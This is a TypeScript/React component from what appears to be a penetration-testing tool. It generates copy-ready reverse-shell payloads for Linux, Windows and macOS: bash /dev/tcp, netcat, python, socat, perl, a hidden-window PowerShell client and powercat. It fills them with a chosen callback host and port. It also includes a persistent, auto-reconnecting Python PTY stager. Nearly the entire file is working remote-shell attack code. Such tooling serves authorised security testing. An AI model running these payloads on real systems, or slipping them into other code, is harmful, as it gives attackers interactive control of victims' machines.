import { useState } from "react";

// A curated reverse-shell payload catalog — "recce writes the payload for you". Templates
// are filled with the listener's LHOST + port so a tester never hand-assembles a one-liner
// or guesses which works on a given target. Grouped by platform because that's the real
// decision (bash /dev/tcp is Linux-only; Windows needs PowerShell, etc.).
type P = { label: string; tmpl: string; note?: string };
const CATALOG: { group: string; items: P[] }[] = [
  {
    group: "Linux / Unix",
    items: [
      { label: "bash", tmpl: "bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1", note: "bash only (not dash/busybox)" },
      { label: "bash (fd)", tmpl: "0<&196;exec 196<>/dev/tcp/{LHOST}/{PORT};sh <&196 >&196 2>&196" },
      { label: "nc (mkfifo)", tmpl: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {PORT} >/tmp/f", note: "no -e needed" },
      { label: "nc -e", tmpl: "nc {LHOST} {PORT} -e /bin/sh" },
      { label: "python3", tmpl: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'" },
      { label: "socat (PTY)", tmpl: "socat TCP:{LHOST}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane", note: "full PTY — best quality" },
      { label: "perl", tmpl: "perl -e 'use Socket;$i=\"{LHOST}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
    ],
  },
  {
    group: "Windows",
    items: [
      { label: "PowerShell", tmpl: "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"", note: "no /dev/tcp on Windows" },
      { label: "nc.exe", tmpl: "nc.exe {LHOST} {PORT} -e cmd.exe" },
      { label: "powercat", tmpl: "powercat -c {LHOST} -p {PORT} -e cmd.exe", note: "needs powercat loaded" },
    ],
  },
  {
    group: "macOS",
    items: [
      { label: "python3", tmpl: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/zsh\",\"-i\"])'", note: "default shell is zsh" },
      { label: "bash", tmpl: "bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1", note: "if bash present" },
    ],
  },
];

// The robust shell: a reconnecting-PTY stager. Unlike the raw one-liners below, this gives
// a real PTY (full interactivity from byte one — no stabilize dance), announces a session
// token so it rebinds to the SAME recce session, and auto-reconnects on drop. A script, not
// a compiled implant — plain transport, no toolchain.
const STAGER = `python3 -c 'import socket,os,pty,select,time,signal
T="{TOKEN}";H="{LHOST}";P={PORT}
while 1:
 s=None;pid=0
 try:
  s=socket.socket();s.connect((H,P));s.send(b"RECCE1 "+T.encode()+b"\\n")
  pid,fd=pty.fork()
  if pid==0:os.execv("/bin/sh",["/bin/sh","-c","exec bash -i 2>/dev/null||exec sh -i"])
  while 1:
   r=select.select([s,fd],[],[])[0]
   if s in r:
    d=s.recv(1024)
    if not d:break
    os.write(fd,d)
   if fd in r:
    d=os.read(fd,1024)
    if not d:break
    s.send(d)
 except Exception:pass
 try:
  if pid>0:os.kill(pid,signal.SIGKILL)
 except:pass
 try:
  if s:s.close()
 except:pass
 time.sleep(5)'`;

const genToken = () => {
  const a = new Uint8Array(8);
  crypto.getRandomValues(a);
  return "t" + Array.from(a, (b) => b.toString(16).padStart(2, "0")).join("");
};

function CopyLine({ text }: { text: string }) {
  const [ok, setOk] = useState(false);
  return (
    <button className="payload-copy" title="copy" onClick={() => {
      navigator.clipboard?.writeText(text).then(() => { setOk(true); setTimeout(() => setOk(false), 1000); });
    }}>{ok ? "✓" : "copy"}</button>
  );
}

export function PayloadCatalog({ port }: { port: number }) {
  const [lhost, setLhost] = useState(location.hostname);
  const [token] = useState(genToken);
  const fill = (t: string) =>
    t.split("{LHOST}").join(lhost).split("{PORT}").join(String(port)).split("{TOKEN}").join(token);
  return (
    <div className="payload-catalog">
      <label className="payload-lhost">
        LHOST <input className="scan-in" value={lhost} onChange={(e) => setLhost(e.target.value)}
                     title="the address the target should call back to" />
      </label>

      <div className="payload-group">
        <div className="payload-group-h robust">★ Robust · auto-reconnect PTY (recommended)</div>
        <div className="payload-item robust-item">
          <span className="payload-label">python</span>
          <code className="payload-code">{fill(STAGER)}</code>
          <span className="payload-note muted small">full PTY, self-healing — survives drops &amp; rebinds</span>
          <CopyLine text={fill(STAGER)} />
        </div>
      </div>

      {CATALOG.map((g) => (
        <div key={g.group} className="payload-group">
          <div className="payload-group-h">{g.group}</div>
          {g.items.map((p) => (
            <div key={p.label} className="payload-item">
              <span className="payload-label">{p.label}</span>
              <code className="payload-code">{fill(p.tmpl)}</code>
              {p.note && <span className="payload-note muted small">{p.note}</span>}
              <CopyLine text={fill(p.tmpl)} />
            </div>
          ))}
        </div>
      ))}
    </div>
  );
}
